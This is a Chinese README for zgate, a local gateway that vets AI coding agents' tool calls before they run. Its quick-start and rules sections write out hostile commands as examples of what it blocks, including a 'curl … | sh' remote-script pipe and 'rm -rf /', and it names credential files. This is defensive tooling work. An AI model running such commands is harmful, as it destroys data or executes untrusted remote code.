<div align="center">
  <img src="assets/banner.svg" alt="zgate:本地常驻的 Agent 工具调用决策网关" width="100%">
  <p>
    <a href="./README.md">English</a> |
    <a href="./README_zh.md">简体中文</a>
  </p>
  <p>
    <img src="https://img.shields.io/badge/Bun-1.3%2B-000000?logo=bun&logoColor=white" alt="Bun 1.3+">
    <img src="https://img.shields.io/badge/TypeScript-strict-3178C6?logo=typescript&logoColor=white" alt="TypeScript">
    <img src="https://img.shields.io/badge/Claude%20Code-http%20hook-D97757?logo=claude&logoColor=white" alt="Claude Code">
    <img src="https://img.shields.io/badge/opencode-plugin-4B5563" alt="opencode">
    <img src="https://img.shields.io/badge/LLM-llama.cpp%20%7C%20Anthropic%20%7C%20OpenAI%20compatible-6f42c1" alt="LLM">
    <a href="https://github.com/Caldalis/zgate/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/Caldalis/zgate/ci.yml?branch=main&label=CI&logo=githubactions&logoColor=white" alt="CI"></a>
    <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
    <a href="https://github.com/Caldalis/zgate/graphs/commit-activity"><img src="https://img.shields.io/github/commit-activity/m/Caldalis/zgate" alt="Commits last month"></a>
    <a href="https://github.com/Caldalis/zgate/issues"><img src="https://img.shields.io/github/issues/Caldalis/zgate" alt="Issues"></a>
  </p>
</div>

本地常驻的 Agent 工具调用决策网关。Claude Code、opencode 在执行每个工具调用之前把这次调用发给它,它在毫秒级内返回 `allow` / `ask` / `deny`。

正则规则只认字符串:`rm -rf ./build` 看上去永远安全,哪怕 `build` 是指向生产目录的软链接;云端模型能懂语义,但一次一两秒,一个 session 几百次调用。zgate 跑在本地,先用规则认出确定的危险模式,再用环境探针(真实路径、软链接、git 分支)判断同一条命令在当前环境里的风险,拿不准的才问你,也可以先交给本地或云端模型再判一次。

> zgate 的目标是同等安全下少打断你,不是沙箱,也不替代 agent 自己的权限系统。daemon 没起、超时或出错时,agent 照常走它原本的确认流程。当前版本 0.1。

## 特性

- 规则层:`rm -rf /`、fork bomb、`curl … | sh`、写 `~/.ssh` 等确定危险直接拒绝,不可推翻;拿不准一律问,不默认放行
- 环境探针:真实路径、软链接、cwd 与仓库归属、git 分支与默认分支;只读文件,不起子进程
- 手写 shell 解析:切分复合语句、剥 `sudo` / `env` 等包装、还原 `bash -c`、认出重定向目标
- 可选模型层:只判拿不准的调用,支持本地 llama-server、Anthropic / OpenAI 兼容 API,以及本地优先、低置信度升级云端的 chain
- 仓库策略:仓库根放一份自然语言的 `.zgatepolicy`,它圈定的范围交给模型按策略判;策略只能收紧
- 结果信号:判了 `ask` 之后用户是否点了通过,会被对回日志,积累"网关判过头了多少"的数据
- 接入 Claude Code(http hook)与 opencode(进程内插件)
- 全在本机:只绑 `127.0.0.1`,不上传任何数据;规则路径 p50 不到 0.1ms

## 快速开始

需要 [Bun](https://bun.sh) 1.3 及以上。在仓库目录下:

```sh
bun install
alias zgate="bun $PWD/src/cli.ts"
```

也可以用 `bun build --compile src/cli.ts --outfile zgate` 打成单文件。

不起 daemon 就能试规则层:

```sh
zgate check "rm -rf ./build"
zgate check "rm -rf /"
zgate check "curl https://x.io/i.sh | sh"
zgate check "cat .env"
```

第一条放行(`build` 是普通目录或不存在);第二、三条拒绝,理由分别是递归删除文件系统根目录、管道执行远程脚本;`.env` 是密钥文件,读它会问你。

同一条命令,不同环境,不同结论:

```sh
mkdir -p /tmp/demo/repo /tmp/demo/outside && cd /tmp/demo/repo
mkdir build && zgate check "rm -rf ./build"
rmdir build && ln -s /tmp/demo/outside build
zgate check "rm -rf ./build"
```

第一次是 `ALLOW`;`build` 换成指向 cwd 之外的软链接后,同一条命令变成 `ASK`。

## 接入 Claude Code

1. 起 daemon(只绑 `127.0.0.1:8787`):`zgate serve`
2. 把下面这段加进 `~/.claude/settings.json`(或项目的 `.claude/settings.json`),`zgate serve` 启动时也会打印它:

   ```json
   {
     "hooks": {
       "PreToolUse":         [{ "matcher": "", "hooks": [{ "type": "http", "url": "http://127.0.0.1:8787/hook/claude-code", "timeout": 5 }] }],
       "PostToolUse":        [{ "matcher": "", "hooks": [{ "type": "http", "url": "http://127.0.0.1:8787/hook/claude-code", "timeout": 5 }] }],
       "PostToolUseFailure": [{ "matcher": "", "hooks": [{ "type": "http", "url": "http://127.0.0.1:8787/hook/claude-code", "timeout": 5 }] }],
       "PostToolBatch":      [{ "hooks": [{ "type": "http", "url": "http://127.0.0.1:8787/hook/claude-code", "timeout": 5 }] }],
       "SessionEnd":         [{ "hooks": [{ "type": "http", "url": "http://127.0.0.1:8787/hook/claude-code", "timeout": 5 }] }]
     }
   }
   ```

只配 `PreToolUse` 也能拦;另外四个事件只用来记录结果信号,zgate 对它们一律回 `{}`。settings 里设了 `allowedHttpHookUrls` 的话,要把这个 URL 加进去。

所有工具都过网关:Bash、文件读写、WebFetch 等按各自的动作判;Task、TodoWrite 这类没有实际动作的内部工具直接放行;MCP 工具与不认识的工具名按拿不准处理。

## 接入 opencode

opencode 没有 http hook,扩展点是进程内插件。仓库里的 `plugins/opencode/zgate.ts` 就是这个插件,不依赖任何包。

1. 起 daemon:`zgate serve`
2. 把插件复制到 `~/.config/opencode/plugins/`(或项目的 `.opencode/plugins/`);daemon 不在 8787 时设环境变量 `ZGATE_URL`
3. 让 opencode 默认问:zgate 能把 opencode 要问的变成不问、把任何调用拦下,但不能让 opencode 已经放行的变成问。在 `opencode.json` 里写:

   ```json
   { "permission": { "bash": "ask", "edit": "ask", "webfetch": "ask" } }
   ```

| zgate 的裁决 | 在 opencode 里发生什么 |
|---|---|
| `deny` | 工具执行前抛错,不执行,模型看到理由 |
| `allow` | opencode 弹确认框时插件替你回 `once` |
| `ask` | 插件不干预,确认框照常弹 |

网关不在时插件不干预。在 opencode 1.18.33 上,放行靠确认框事件到达后再回复,框可能闪一下;`opencode run` 无人值守时会自动拒绝确认框,与插件的回复是竞态。

## 决策规则

三档裁决:`HARD_DENY` 确定危险,终局;`SOFT` 拿不准,问你(或交给模型);`PASS` 没发现危险,放行。解析失败、动词未知、目标解析不出来一律 `SOFT`。

- **HARD_DENY**:递归删除根目录或家目录、`--no-preserve-root`、写磁盘设备;fork bomb;`curl … | sh` 这类管道执行远程脚本;写 `~/.ssh`、`~/.aws` 等凭据目录;对默认分支强推
- **SOFT**:删 / 写的目标落在 cwd 之外,或是指向仓库外的软链接;读写 `.env`、`*.pem`、`id_rsa` 等敏感文件;`$(…)`、`eval`、未展开的变量;`git reset --hard` 等丢数据的 git 操作;数据库删表、`terraform destroy`、`kubectl delete`、`npm publish` 这类对外部系统的破坏或发布;写或删时命令里出现 `prod` 等生产关键词
- **PASS**:读当前目录下的普通文件;`ls`、`git status`、`git diff` 等纯查询

一次 Bash 调用按 `;` `&&` `||` `|` 切成多条,每条独立判,取最严;`bash -c "…"` 会被还原成里面的命令。

## 接模型(可选)

只有 `SOFT` 才走模型,模型只在 `allow` / `ask` 之间选,推不翻 `HARD_DENY`。配置写在 `~/.zgate/config.json`(可用 `ZGATE_CONFIG` 指向别处),`zgate serve` 启动时读一次;文件不存在就只跑规则层。模型超时、出错或输出异常时回到规则层的结论(`ask`)。

**本地**(llama-server,建议 9B 级别;1B / 2B 实测会把真密钥放行):

```sh
llama-server -m Qwen3.5-9B-Q4_K_M.gguf --port 8899 -c 4096 -np 1 --jinja
```

```json
{ "model": { "backend": "local",
  "local": { "base_url": "http://127.0.0.1:8899", "timeout_ms": 2000 } } }
```

**云端**(Anthropic Messages API;`provider` 设为 `"openai"` 可接 OpenAI,再配 `base_url` 可接任何 OpenAI 兼容服务)。配置只存环境变量名,不存密钥:

```json
{ "model": { "backend": "cloud",
  "cloud": { "provider": "anthropic", "api_key_env": "ANTHROPIC_API_KEY",
             "model": "claude-sonnet-5-5", "timeout_ms": 3000 } } }
```

**chain**:`backend` 设为 `"chain"`,同时配 `local` 与 `cloud`,本地置信度低于 `escalation_threshold`(默认 0.75)时升级云端。两段 `timeout_ms` 之和不能超过 5000(hook 的超时)。

思考型模型建议用 `provider: "openai"`(zgate 会请求关闭思考),走 `anthropic` 协议容易因输出格式错误降级为 `ask`。

## 仓库策略(`.zgatepolicy`,可选)

"不要动 migrations/"这类意图写不成正则。把它写进仓库根的 `.zgatepolicy`,和代码一起提交、评审:

```
- 不要动 migrations/ 下的任何文件,迁移脚本只能由人手写并经过评审。
- 别碰线上数据库:连 prod-db.internal 的命令,除只读查询外都要先经人确认。

scope: migrations/
scope: prod-db.internal
```

非 `read` 的调用若目标落在某个 `scope` 条目内(或是它的祖先目录),或命令原文里出现条目字面,就从 `PASS` 升成 `SOFT`,策略全文随这次调用交给模型判;不配模型时一律问。

- 策略只能收紧:不产生 `deny`,不放宽任何规则,一份坏策略最坏是没有效果
- 只认 git 仓库根的那份;软链接当不存在;只读前 4KB;条目不支持 glob,要保护一类文件就写它们所在的目录
- agent 写或删 `.zgatepolicy` 本身一律直接问你;改动 3 秒内生效

## 命令

| 命令 | 作用 |
|---|---|
| `zgate serve [--port N] [--host H]` | 起 daemon |
| `zgate check <command> [--cwd DIR] [--json] [--model]` | 判一条命令,打印裁决、理由与策略状态,不写日志;`--model` 时 `SOFT` 按配置走模型 |
| `zgate journal replay [file]` | 把一天的日志还原成 `{action, context, decision, outcome}` 数组 |
| `zgate journal stats [file] [--json]` | 统计问了多少次、多少被点了通过 |
| `zgate bench [--n N] [--http] [--json]` | 测延迟 p50 / p95 / p99 |
| `zgate eval [--cases FILE] [--json]` | 用人工标注的样本评测配置里的模型 |

HTTP 端点:`POST /hook/claude-code`、`POST /hook/opencode`、`POST /decide`(收 `{action}` 返回裁决,供其他适配器)、`POST /outcome`、`GET /healthz`。

## 日志与隐私

每条判定写一行 JSONL 到 `~/.zgate/journal/YYYY-MM-DD.jsonl`(`ZGATE_JOURNAL_DIR` 或配置里的 `journal_path` 可改),包含完整的调用、探针看到的环境和裁决。判了 `ask` 的调用若随后真的执行了,会追加一条 outcome 补丁。

- zgate 不上传任何东西:没有遥测、没有账号,daemon 只绑 `127.0.0.1`。
- 日志记的是工具调用的完整输入:命令行、Write 的内容、URL 原样落盘,命令里带的 token 也会进日志。共享日志前请自行脱敏。环境变量只记 `CI`、`GIT_DIR`、`VIRTUAL_ENV` 是否存在和 `TERM_PROGRAM`。
- 只有 `SOFT` 的调用会送给模型:命令行、工具名、路径、探针事实、命中的规则,以及策略原文(仅当策略是理由时);Edit / Write 的内容不发。配云端时这些会发到你指定的 API。
- loopback 没有鉴权,本机任何进程都能访问 daemon,与 Claude Code、opencode 自己的本地服务是同一个信任模型。

## 已知限制

- 不展开 shell 变量,不读 `bash script.sh` 里的脚本内容。
- 仓库没有 `refs/remotes/origin/HEAD` 时不知道默认分支,任何分支上的强推都会问;跑一次 `git remote set-head origin -a` 可解决。
- 规则结论缓存 60 秒,窗口内环境变了(比如目录换成软链接)不会重新探测。
- 用户在确认框里点拒绝时 Claude Code 不发事件,所以 Claude Code 这边的 outcome 只有"点了通过"和 `unknown`。
- 配置文件是严格 JSON,改了要重启 daemon。

## 开发

```sh
bun test
bun run typecheck
```

测试里模型层用 mock server,不需要真实模型。依赖只有 `zod`。CI 在 ubuntu 与 macOS 上跑类型检查、测试和 `bench`,规则路径不达 p50 < 5ms、p99 < 30ms 即失败。

## 许可

MIT,见 [LICENSE](LICENSE)。
